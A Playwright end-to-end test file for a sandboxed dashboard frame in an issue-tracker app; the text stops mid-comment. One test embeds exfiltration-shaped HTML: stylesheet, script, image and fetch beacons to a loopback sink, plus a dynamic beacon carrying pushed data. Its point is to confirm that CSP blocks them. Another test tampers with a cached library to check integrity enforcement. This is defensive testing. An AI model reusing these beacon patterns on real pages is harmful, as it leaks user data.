import { spawn } from 'node:child_process'
import { readFileSync, writeFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { expect, test, type APIRequestContext, type Page } from '@playwright/test'
import { attachConsoleErrors, e2eHomeDir, gotoApp } from './helpers'

/*
 * Agent dashboards, web host half (GDK-782/793; vendor GDK-792; libs
 * GDK-808) — against the real serve binary. The contracts this file pins:
 *
 *  1. opening from the sidebar renders the example dashboard inside the
 *     sandboxed frame and every datasource's data arrives (postMessage).
 *  2. `dashboards save` on an open dashboard swaps the whole frame without
 *     reloading the page — the GDK-793 p95 ≤ 1s authoring contract.
 *  3. the frame's own outbound attempts never reach the network: CSP refuses
 *     img/script/style/fetch to an external host before a request is made.
 *  4. libraries beyond uPlot come from the local lib cache (GDK-808):
 *     `lib add` downloads once (loopback mock CDN below — no real internet
 *     in any test), render executes the cached script (test 5) with zero
 *     render-time requests back to the host it was fetched from, and cache
 *     bytes tampered after the add refuse to serve — no execution, and the
 *     injected tag's onerror marker is visible to the document (test 6).
 *
 * Fixture hygiene: dashboard rows live in local.db, which serve.sh seeds
 * fresh per server start — but reuseExistingServer keeps one server alive
 * across local runs, so every test names its rows with PREFIX and the sweep
 * in beforeAll/afterAll deletes them (a crashed run is cleaned by the next
 * run's beforeAll). Lib cache entries are `lib rm`-ed by the tests that
 * added them; a crashed run leaves bytes that the next run's identical-mock
 * re-add turns into an idempotent `present`.
 */

const E2E_DIR = dirname(fileURLToPath(import.meta.url))
const RUN = Date.now().toString(36)
const PREFIX = 'E2E Dash'
const FRAME_SEL = 'iframe[data-testid="dashboard-frame"]'
const GADAK_BIN = join(E2E_DIR, '.tmp', 'gadak')
const GADAK_HOME = e2eHomeDir()

/** The example's own registration comment is the source of truth for these. */
const TRIAGE_DS = {
  by_status: {
    sql: 'select status_category, count(*) as n from issues_full group by 1 order by 1',
  },
  top_open: {
    sql: "select key, priority_rank, summary from issues_full where status_category != 'done' order by priority_rank, updated_at desc limit 8",
  },
  monthly_opened: {
    sql: "select strftime('%s', substr(created_at, 1, 7) || '-01') as t, count(*) as n from issues_full where created_at >= date('now', '-11 months') group by 1 order by 1",
  },
  mine: { jql: 'assignee = currentUser() AND resolution is EMPTY' },
}

const TOTAL_DS = { total: { sql: 'select count(*) as n from issues_full' } }

type SavedRow = { id: string; name: string }

async function saveDash(
  request: APIRequestContext,
  name: string,
  html: string,
  datasources: Record<string, { sql?: string; jql?: string }>,
  libs?: string[],
): Promise<SavedRow> {
  const res = await request.post('/api/v1/dashboards/', {
    data: { name, config: { html, datasources, ...(libs ? { libs } : {}) } },
  })
  expect(res.status(), `save ${name} failed: ${await res.text()}`).toBe(201)
  return (await res.json()) as SavedRow
}

/** Delete every dashboard this file (or a crashed earlier run) created. */
async function sweep(request: APIRequestContext): Promise<void> {
  const res = await request.get('/api/v1/dashboards/')
  if (!res.ok()) return
  const { dashboards } = (await res.json()) as { dashboards: SavedRow[] }
  for (const d of dashboards) {
    if (d.name.startsWith(PREFIX)) await request.delete(`/api/v1/dashboards/${d.id}/`)
  }
}

/** Minimal authored document: a version marker plus the pushed row count. */
function markerHtml(marker: string): string {
  return `<!doctype html><html><body style="font: 14px sans-serif">
<div data-testid="dash-version">${marker}</div>
<div id="pushed">waiting</div>
<script>
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent =
    String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0') + (d.warning ? ' warn:' + d.warning : '');
});
</script>
</body></html>`
}

test.beforeAll(async ({ request }) => {
  await sweep(request)
})
test.afterAll(async ({ request }) => {
  await sweep(request)
})

test('open from the sidebar renders the example wall and every datasource arrives', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} triage`
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, name, html, TRIAGE_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page).toHaveURL(/dash=/)

  const fl = page.frameLocator(FRAME_SEL)
  // Data arrival: the stamp counts datasources that pushed (a failed one
  // still pushes, with a warning), and the open-count card left its dash.
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  // Non-zero: the demo pool always has open work (see DEMO_ISSUE_COUNT for
  // the single-owner constant pattern this intentionally avoids).
  await expect(fl.locator('#n-open')).toHaveText(/^[1-9][0-9]*$/)
  // GDK-792, in situ: uPlot loaded from the vendor route and drew a canvas.
  await expect(fl.locator('#monthly canvas').first()).toBeVisible()
})

/*
 * GDK-1053: the authored wall must fit its frame. The triage grid used to
 * declare bare `1.5fr 1fr`, and a bare fr track floors at its content's
 * min-content — the nowrap row summaries inflated both tracks to
 * [656.8px 763.2px] while the frame was 1168px (1440x900) and 1008px
 * (1280x800) wide, so the right card ("Open by status" / "Mine (open)")
 * landed 286px/446px past the viewport, and a wheel probe over it moved
 * nothing (macOS overlay scrollbars leave no gutter to grab). Measured
 * mechanism, killed hypothesis: the uPlot canvas was NOT the driver — a
 * probe with the canvas forced to 300px left the tracks and the overflow
 * unchanged. The tracks are minmax(0, …) now; this pins the geometry
 * contract at both audited sizes, inside the sandboxed frame. The frame is
 * sandboxed to an opaque origin, so page JS cannot reach it — Playwright's
 * frame handle can (protocol-level, no SOP).
 */
test('GDK-1053: the authored wall fits its frame — no track blowout at the audited sizes', async ({
  page,
}) => {
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} fit`, html, TRIAGE_DS)
  await page.setViewportSize({ width: 1440, height: 900 })
  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  await expect(fl.locator('#monthly canvas').first()).toBeVisible()

  const frame = page.frames().find((f) => f.url().includes('/render/'))
  expect(frame, 'render frame inspectable from the test (protocol-level)').toBeTruthy()
  const inFrameOverflow = () =>
    frame!.evaluate(
      () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
    )

  for (const size of [
    { width: 1440, height: 900 },
    { width: 1280, height: 800 },
  ]) {
    await page.setViewportSize(size)
    // The wait is on the state under test: layout at this size, plus the
    // authored file's debounced (100ms) chart re-fit after the viewport move.
    await expect
      .poll(inFrameOverflow, { timeout: 5000 })
      .toBeLessThanOrEqual(1)
    // The right card inside the app viewport (boundingBox is main-frame
    // relative, so this is the user-visible "not cut at the edge" contract).
    const box = await fl.locator('main > .panel').nth(1).boundingBox()
    expect(box, `right card box at ${size.width}x${size.height}`).toBeTruthy()
    expect(
      box!.x + box!.width,
      `right card right edge at ${size.width}x${size.height}`,
    ).toBeLessThanOrEqual(size.width)
  }
})

/*
 * GDK-1068: every text in the bars SVG must land inside the viewBox. The
 * value label sits at pad + barWidth + 6, so the longest bar (barWidth =
 * full scale) put its label at x=326 in a 320-wide viewBox — clipped at any
 * viewport, whatever the data, since the max bar always uses the full scale.
 * getBBox() is in user (viewBox) units, so the comparison is scale-free.
 */
test('GDK-1068: bar value labels land inside the viewBox', async ({ page }) => {
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} bars`, html, TRIAGE_DS)
  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  await expect(fl.locator('#bars svg')).toBeVisible()

  const frame = page.frames().find((f) => f.url().includes('/render/'))
  expect(frame, 'render frame inspectable from the test (protocol-level)').toBeTruthy()
  const worstOverhang = await frame!.evaluate(() => {
    const svg = document.querySelector('#bars svg') as SVGSVGElement
    const vbW = svg.viewBox.baseVal.width
    let worst = -Infinity
    for (const t of svg.querySelectorAll('text')) {
      const b = (t as SVGTextElement).getBBox()
      worst = Math.max(worst, b.x + b.width - vbW)
    }
    return worst
  })
  expect(worstOverhang, 'user-unit overhang past the viewBox right edge').toBeLessThanOrEqual(0)
})

/*
 * GDK-1082: the wall follows the same theme axis as the app shell. The app's
 * axis is prefers-color-scheme as the default, data-theme as the override
 * (web/src/lib/theme.ts) — but the sandboxed frame cannot see the parent's
 * data-theme attribute (opaque origin, no allow-same-origin), so the only
 * axis a wall can honestly follow is the media query: the app default
 * (system) and the frame now move together, which is the audited defect —
 * in a light shell the sidebar painted cream while the wall stayed dark.
 * The light contract: the iframe body background channel average >= 200
 * (cream mood, converged on the app's light tokens), body text contrast
 * checked separately by the palette itself (--color-text-primary on
 * --color-bg-base). The dark sibling pins the pre-fix dark capture so
 * re-theming cannot bleed light values into dark (regression guard — green
 * before and after by design, it pins the baseline).
 *
 * Two describes because a second test.use() in one block overrides the
 * option for the whole block — the light shell ran dark that way and read
 * 17.3 on its own gate (measured in this round).
 */
const bodyChannelAvg = (frame: ReturnType<Page['frames']>[number]) =>
  frame.evaluate(() => {
    const m = getComputedStyle(document.body).backgroundColor.match(/(\d+),\s*(\d+),\s*(\d+)/)
    return m ? (Number(m[1]) + Number(m[2]) + Number(m[3])) / 3 : -1
  })
const openTriage = async (page: Page) => {
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} theme`, html, TRIAGE_DS)
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  const frame = page.frames().find((f) => f.url().includes('/render/'))
  expect(frame, 'render frame inspectable from the test (protocol-level)').toBeTruthy()
  return frame!
}

test.describe('GDK-1082: the wall follows prefers-color-scheme — light shell', () => {
  test.use({ colorScheme: 'light' })
  test('a light shell reads a light wall (body bg channel average >= 200)', async ({ page }) => {
    const frame = await openTriage(page)
    const avg = await bodyChannelAvg(frame)
    expect(
      avg,
      'iframe body background channel average with prefers-color-scheme: light',
    ).toBeGreaterThanOrEqual(200)
  })
})

test.describe('GDK-1082: the wall keeps the authored dark palette — dark shell', () => {
  test.use({ colorScheme: 'dark' })
  test('a dark shell keeps the authored dark palette untouched', async ({ page }) => {
    const frame = await openTriage(page)
    const dark = await frame.evaluate(() => ({
      body: getComputedStyle(document.body).backgroundColor,
      card: getComputedStyle(document.querySelector('.card') as Element).backgroundColor,
      h2: getComputedStyle(document.querySelector('.panel h2') as Element).color,
    }))
    // The pre-fix dark capture, pinned element by element (2026-08-28 audit).
    expect(dark, 'dark wall must stay the pre-fix dark palette').toEqual({
      body: 'rgb(13, 16, 23)',
      card: 'rgb(22, 27, 38)',
      h2: 'rgb(139, 148, 167)',
    })
  })
})

/*
 * GDK-1080: at 800x900 the wall folded its stat tiles to 2x2 but the widget
 * grid kept a track wider than the frame — measured pre-fix: frame
 * clientWidth 528, scrollWidth 785, the "Top open by priority" panel's right
 * edge at 768.2px, past the frame. The mechanism is the narrow media
 * override itself: `grid-template-columns: 1fr` is minmax(auto, 1fr), whose
 * min track sizing function is the content's min-content — the uPlot canvas
 * (init-sized from a host read before layout settled) floored the track at
 * its own width, re-introducing at <=960 exactly the bare-fr blowout
 * GDK-1053 killed above 960. The contract here: zero horizontal overflow in
 * the frame AND every title / value label / bar text inside the frame
 * viewport, booting straight into the dash= param at 800 so the init race
 * is what runs.
 */
test('GDK-1080: at 800x900 the wall has zero horizontal overflow and no clipped title or label', async ({
  page,
}) => {
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} narrow`, html, TRIAGE_DS)
  await page.setViewportSize({ width: 800, height: 900 })
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  await expect(fl.locator('#monthly canvas').first()).toBeVisible()

  const frame = page.frames().find((f) => f.url().includes('/render/'))
  expect(frame, 'render frame inspectable from the test (protocol-level)').toBeTruthy()
  const inFrameOverflow = () =>
    frame!.evaluate(
      () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
    )
  // The wait is on the state under test: layout at 800 plus the authored
  // file's debounced (100ms) chart re-fit.
  await expect.poll(inFrameOverflow, { timeout: 5000 }).toBeLessThanOrEqual(0)
  // The app page itself does not scroll sideways either (the literal 800
  // half of the contract: the frame is ~528px here, so <=800 is implied by
  // overflow 0 — the frame-side assertion above is the stronger half).
  const appOverflow = await page.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  )
  expect(appOverflow, 'app horizontal overflow at 800x900').toBeLessThanOrEqual(0)

  // Every title / value label / bar text lands inside the frame viewport:
  // the audit's symptom was titles hard-clipped mid-word and bar values cut
  // at the right edge. Titles must ellipsize (CSS), never leave the box.
  const worst = await frame!.evaluate(() => {
    const w = document.documentElement.clientWidth
    let worst = -Infinity
    let label = ''
    for (const el of document.querySelectorAll('h1, h2, .n, .label, #bars svg text')) {
      const r = el.getBoundingClientRect()
      if (r.width === 0) continue
      if (r.right - w > worst) {
        worst = r.right - w
        label = (el.textContent ?? '').slice(0, 30)
      }
    }
    return { worst, label, w }
  })
  expect(
    worst.worst,
    `rightmost element "${worst.label}" vs ${worst.w}px frame viewport`,
  ).toBeLessThanOrEqual(0)
})

test('the dash= URL param restores the dashboard on a cold boot', async ({ page }) => {
  const saved = await saveDash(
    page.request,
    `${PREFIX} ${RUN} restore`,
    markerHtml('v1'),
    TOTAL_DS,
  )
  // Cold boot straight into the param — no sidebar, restore-before-bind.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  // The first push landed too — restore is not a blank frame.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  await page.getByTestId('dashboard-close').click()
  await expect(page.getByTestId('dashboard-view')).toBeHidden()
  await expect(page.getByTestId('issue-layout')).toBeVisible()
})

test('save on an open dashboard swaps the frame without a reload (p95 <= 1s)', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} swap`
  const saved = await saveDash(page.request, name, markerHtml('v1'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  // A page reload would wipe this; a frame swap must not touch it.
  await page.evaluate(() => {
    ;(window as { __e2eNoReload?: number }).__e2eNoReload = 1
  })

  const samples: number[] = []
  for (let gen = 1; gen <= 3; gen++) {
    const t0 = Date.now()
    await saveDash(page.request, name, markerHtml(`v${gen + 1}`), TOTAL_DS)
    // renderGen is the swap signal: the {#key} wrapper re-created the frame.
    await expect(page.locator(FRAME_SEL)).toHaveAttribute('data-render-gen', String(gen), {
      timeout: 5000,
    })
    await expect(fl.getByTestId('dash-version')).toHaveText(`v${gen + 1}`)
    // And the new document got its first push (the swap contract is
    // "replace, then push" — not "replace and go dark").
    await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
    samples.push(Date.now() - t0)
  }

  samples.sort((a, b) => a - b)
  const median = samples[1]
  console.log(`[dashboards] save→swap samples ${samples.join('/')}ms (median ${median}ms)`)
  expect(
    median,
    `save→swap median ${samples.join('/')}ms — over the 1s p95 contract (0.5s poll + one row fetch)`,
  ).toBeLessThanOrEqual(1000)
  expect(Math.max(...samples)).toBeLessThan(4000)
  expect(await page.evaluate(() => (window as { __e2eNoReload?: number }).__e2eNoReload)).toBe(1)
})

test("the frame's outbound attempts are refused before any socket is opened", async ({ page }) => {
  // The observable matters. Chromium creates a request OBJECT for a
  // CSP-refused subresource and then discards it before connecting — so
  // page.on('request') / devtools' network panel show canceled entries for
  // loads that never sent a byte (measured here during GDK-792: 4 CDP
  // request events, 0 TCP connections). The contract this test pins is at
  // the socket: a loopback sink receives nothing. The sink is also the
  // containment — even on a CSP regression, the "external" host is 127.0.0.1.
  const received: string[] = []
  const sink: Server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    // The external script must be executable if it ever arrives: a 404 would
    // mask a CSP regression as a load error. Serving it is what makes the
    // in-frame #ext assertion meaningful.
    if ((req.url ?? '').includes('static-js')) {
      res.writeHead(200, { 'content-type': 'application/javascript' })
      res.end("document.getElementById('ext').textContent = 'EXECUTED';")
      return
    }
    res.writeHead(404)
    res.end()
  })
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', resolve))
  const sinkPort = (sink.address() as { port: number }).port
  const beacon = (path: string) => `http://127.0.0.1:${sinkPort}/${path}`

  const html = `<!doctype html><html><head>
<link rel="stylesheet" href="${beacon('static-css?d=secret')}">
<script src="${beacon('static-js?d=secret')}"></script>
</head><body>
<img src="${beacon('static-pixel?d=secret')}"
     onload="document.getElementById('img').textContent = 'LOADED (leak)'"
     onerror="document.getElementById('img').textContent = 'refused'">
<div id="img">pending</div>
<div id="fetch">pending</div>
<div id="ran">no</div>
<div id="ext">no</div>
<div id="dyn">pending</div>
<div id="pushed">waiting</div>
<script>
document.getElementById('ran').textContent = 'yes';
fetch('${beacon('fetch-beacon?d=secret')}').then(
  function () { document.getElementById('fetch').textContent = 'LOADED (leak)'; },
  function (e) { document.getElementById('fetch').textContent = 'refused ' + e.name; }
);
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent = String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0');
  // The exfiltration shape that matters: pushed mirror data encoded into a
  // dynamically constructed subresource URL after it arrives.
  var b = document.createElement('img');
  b.src = '${beacon('dyn-beacon')}?d=' + encodeURIComponent(document.getElementById('pushed').textContent);
  b.onload = function () { document.getElementById('dyn').textContent = 'LOADED (leak)'; };
  b.onerror = function () { document.getElementById('dyn').textContent = 'refused'; };
  document.body.appendChild(b);
});
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} blockednet`, html, TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  // The document itself ran, and each channel was refused in-frame: no
  // external script executed, image/fetch got errors, not content…
  await expect(fl.locator('#ran')).toHaveText('yes')
  await expect(fl.locator('#ext')).toHaveText('no')
  await expect(fl.locator('#fetch')).toHaveText(/^refused /)
  await expect(fl.locator('#img')).toHaveText('refused')
  // …while the host side kept working (pushes are the parent's job), and the
  // dynamic beacon built FROM pushed data was refused too.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  await expect(fl.locator('#dyn')).toHaveText('refused')
  // The duration is the assertion window: any refused-but-issued load, or a
  // deferred beacon, would land on the sink inside it.
  await page.waitForTimeout(800)
  expect(
    received,
    `requests reached a socket: ${received.join(', ')} (CSP refused them only in-frame)`,
  ).toEqual([])
  sink.close()
})

/*
 * The lib cache, end to end (GDK-808). "CDN" below is a loopback mock —
 * no test in this file talks to the internet — and it doubles as the TCP
 * sink: it counts every request that ever reaches it, so "the library was
 * downloaded once, at add time, and never again" is a socket-level claim,
 * not a devtools-panel one (same discipline as the blockednet test above).
 */

/** Mock CDN serving one fixed library body, counting every request. */
async function mockCDN(body: string): Promise<{
  server: Server
  url: (p: string) => string
  received: string[]
}> {
  const received: string[] = []
  const server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    res.writeHead(200, { 'content-type': 'application/javascript' })
    res.end(body)
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const port = (server.address() as { port: number }).port
  return { server, url: (p: string) => `http://127.0.0.1:${port}/${p}`, received }
}

/**
 * Run the e2e CLI binary against the e2e home (the serve's own home).
 * Async spawn, not spawnSync: the mock CDN lives in this same worker
 * process, and a sync spawn freezes the event loop that must answer the
 * child's HTTP request (measured: spawnSync deadlocks lib add into its
 * own timeout).
 */
function runGadak(args: string[]): Promise<{ status: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(GADAK_BIN, args, { env: { ...process.env, GADAK_HOME: GADAK_HOME } })
    let stdout = ''
    let stderr = ''
    child.stdout.on('data', (d) => (stdout += d))
    child.stderr.on('data', (d) => (stderr += d))
    child.on('error', reject)
    child.on('close', (status) => resolve({ status: status ?? -1, stdout, stderr }))
  })
}

/** Pick the value of one `key\tvalue` line out of a TSV stdout. */
function tsvField(out: string, key: string): string {
  const line = out.split('\n').find((l) => l.startsWith(`${key}\t`))
  return line ? line.slice(key.length + 1).trim() : ''
}

/** A document that reports whether the cached lib ran, defensively. */
const libHtml = `<!doctype html><html><head></head><body style="font: 14px sans-serif">
<div id="lib-ran">pending</div>
<div id="lib-error">none</div>
<script>
// Inline registers first; defer scripts (the injected lib tag) run after
// parse but before DOMContentLoaded — so DCL is the first moment that can
// judge both "the lib executed" and "the injected tag errored".
document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('lib-ran').textContent =
    window.__e2eDemoLib ? 'loaded' : 'missing';
  var bad = document.documentElement.getAttribute('data-gadak-lib-error');
  if (bad) document.getElementById('lib-error').textContent = 'lib failed: ' + bad;
});
</script>
</body></html>`

test('lib add caches once and render executes it with zero requests back to its origin', async ({
  page,
}) => {
  const cdn = await mockCDN('window.__e2eDemoLib = {ran: true};\n')
  const url = cdn.url('demo-lib.iife.js')

  // The one user-invoked download. Same bytes on a crashed earlier run →
  // `present` with the same id; both verbs carry the id on line 1.
  const ran = await runGadak(['dashboards', 'lib', 'add', url])
  expect(ran.status, ran.stderr || ran.stdout).toBe(0)
  const id = tsvField(ran.stdout, 'added') || tsvField(ran.stdout, 'present')
  expect(id, `lib add stdout:\n${ran.stdout}`).toMatch(/^[0-9a-f]{16}-demo-lib\.iife\.js$/)
  expect(tsvField(ran.stdout, 'url')).toBe(url)
  expect(tsvField(ran.stdout, 'sha384')).toMatch(/^[0-9a-f]{96}$/)
  // The add-time download is the only request so far.
  expect(cdn.received, `mock CDN saw: ${cdn.received.join(', ')}`).toEqual(['GET /demo-lib.iife.js'])

  try {
    const saved = await saveDash(page.request, `${PREFIX} ${RUN} libok`, libHtml, {}, [id])
    await gotoApp(page)
    await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
    const fl = page.frameLocator(FRAME_SEL)
    // The cached script executed inside the frame: the lib global exists.
    await expect(fl.locator('#lib-ran')).toHaveText('loaded')
    await expect(fl.locator('#lib-error')).toHaveText('none')
    // GDK-808's network claim, at the socket: rendering fetched the lib from
    // the local route, and nothing re-contacted the host it came from. The
    // window is the assertion (a deferred or retrying fetch would land in it).
    await page.waitForTimeout(800)
    expect(
      cdn.received,
      `render-time request(s) reached the lib's origin: ${cdn.received.join(', ')}`,
    ).toEqual(['GET /demo-lib.iife.js'])
  } finally {
    cdn.server.close()
    await runGadak(['dashboards', 'lib', 'rm', id])
  }
})

test('cache bytes tampered after lib add refuse to serve — no execution, visible failure', async ({
  page,
}) => {
  const cdn = await mockCDN('window.__e2eDemoLib = {ran: true};\n')
  const ran = await runGadak(['dashboards', 'lib', 'add', cdn.url('demo-lib.iife.js')])
  expect(ran.status, ran.stderr || ran.stdout).toBe(0)
  const id = tsvField(ran.stdout, 'added') || tsvField(ran.stdout, 'present')
  const path = tsvField(ran.stdout, 'path')
  expect(Boolean(id && path), `lib add stdout:\n${ran.stdout}`).toBeTruthy()

  // Tamper the cached bytes on disk, after the pin was written. The restore
  // in finally is not politeness: a tampered file left behind would make the
  // next run's same-url add refuse ("changed since cached") forever.
  const pinned = readFileSync(path, 'utf8')
  writeFileSync(path, 'window.__e2eDemoLib = {ran: true, evil: true}; // tampered\n')
  try {
    const saved = await saveDash(page.request, `${PREFIX} ${RUN} libtamper`, libHtml, {}, [id])
    await gotoApp(page)
    await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
    const fl = page.frameLocator(FRAME_SEL)
    // The serve route re-hashed the bytes against the pin, answered 500, and
    // the script never executed — the tampered global is absent.
    await expect(fl.locator('#lib-ran')).toHaveText('missing')
    // The injected tag's onerror marker is on the document element, and the
    // defensive dashboard showed it as a broken card instead of a silent gap.
    await expect(fl.locator('#lib-error')).toHaveText(`lib failed: ${id}`)
  } finally {
    writeFileSync(path, pinned) // leave the cache as the add left it
    cdn.server.close()
    await runGadak(['dashboards', 'lib', 'rm', id])
  }
})

/*
 * GDK-815: a dashboard holds the whole main column, so the two contracts
 * every other full-column surface keeps must hold for it too.
 *
 *  1. Applying a view releases the column (showIssueList closed feed/docs/
 *     history but not the dashboard — the list painted behind it).
 *  2. While the dashboard holds the column, no view row claims "you are
 *     here" (mainColumnIsList did not look at dashboards.openId, so the
 *     built-in rows stayed tinted beside a screen that was not the list).
 *
 * The row locator is the one sidebar-active.spec.ts reads — aria-current
 * rides the same condition that paints the row, so a token rename cannot
 * turn this green or red.
 */
test('GDK-815: applying a view releases the column from a dashboard, and the view row re-tints', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} release`, markerHtml('release'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page.locator(FRAME_SEL)).toBeVisible()

  // Hole 2: the dashboard owns the column, so the view tint is not any
  // view's to claim. The dashboard's own row is a place-row like the docs
  // rows and stays excluded: it marks where the person is, not a list.
  const activeViewRows = page.locator(
    'aside nav button[aria-current="true"]:not([data-testid^="docs-"]):not([data-testid="sidebar-dashboard-row"])',
  )
  await expect(activeViewRows).toHaveCount(0)

  // Hole 1: a view row click hands the column to the list. 'All open' is the
  // builtin row nav-issue.spec.ts uses for the same DOCS→list gesture — a
  // fresh home has no saved views for sidebar-view-row to point at.
  await page.getByRole('button', { name: 'All open' }).click()
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-list-scroller')).toBeVisible()
  await expect(activeViewRows.first()).toHaveAttribute('aria-current', 'true')

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
})

/*
 * GDK-827: Esc closes the dashboard — the feed's slot in the chain, i.e.
 * only after browse/menu/bulk/detail had their turn. And the honest edge of
 * this surface: clicking into the sandboxed frame moves key events into the
 * frame's own document, so the parent's Esc cannot reach the dashboard while
 * the frame holds focus. The probe pins that observed fact (so a browser
 * change to it turns this red) and the recovery — any click outside the
 * frame returns keys to the parent document and Esc closes.
 */
test('GDK-827: Esc closes the dashboard; a focused frame swallows the key and a click outside recovers', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} esc`, markerHtml('esc'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page.locator(FRAME_SEL)).toBeVisible()

  // Focus outside the frame: the main contract.
  await page.keyboard.press('Escape')
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-list-scroller')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastKeyCmd)).toBe(
    'close-dashboard',
  )

  // Probe: click into the frame, then Esc. The marker is cleared first —
  // dataset.lastKeyCmd is a sticky high-water mark, so without the reset a
  // swallowed key would read as "close-dashboard ran" off the earlier press.
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await page.evaluate(() => delete document.documentElement.dataset.lastKeyCmd)
  await page.locator(FRAME_SEL).click()
  await page.keyboard.press('Escape')
  // The parent handler never ran — the dashboard is still up and no command
  // was recorded for this press.
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastKeyCmd)).toBeUndefined()

  // Recovery: a click outside the frame, then Esc closes.
  await page.getByTestId('dashboard-view').locator('header').click()
  await page.keyboard.press('Escape')
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
})

/*
 * GDK-854 / GDK-880: links out of the wall. Two channels, each pinned at
 * the point where it could silently regress — and the `open` verb's column
 * decision is now three rules, not one:
 *
 *  1. `open` — the frame→parent navigation verb. The wall posts
 *     {type:'open', hash:'#/…'}; the app classifies the hash and navigates
 *     through its own router (never the frame's string onto location).
 *     2026-08-25 — GDK-880 (product owner): dropping `dash` on every open
 *     was convenience (GDK-815's union "working for free"), not a
 *     requirement. The incoming params decide the column:
 *       - only panel params (`issue` / `doc` / `person`) → the wall stays
 *         and the right panel opens (the hash grammar already expresses
 *         `#/?dash=X&issue=K`; App boot honours both independently);
 *       - a column param (`docs` is the cheapest) → that view takes the
 *         column;
 *       - anything else (filters, mixed panel+filter, unknown, empty) →
 *         the list takes the column.
 *     A dropped/ignored verb still shows up as "the URL never moved".
 *     `document.documentElement.dataset.lastDashOpen` names the rule that
 *     fired (`panel` / `column` / `list`) so a developer can see why a
 *     link took the column without reading the source.
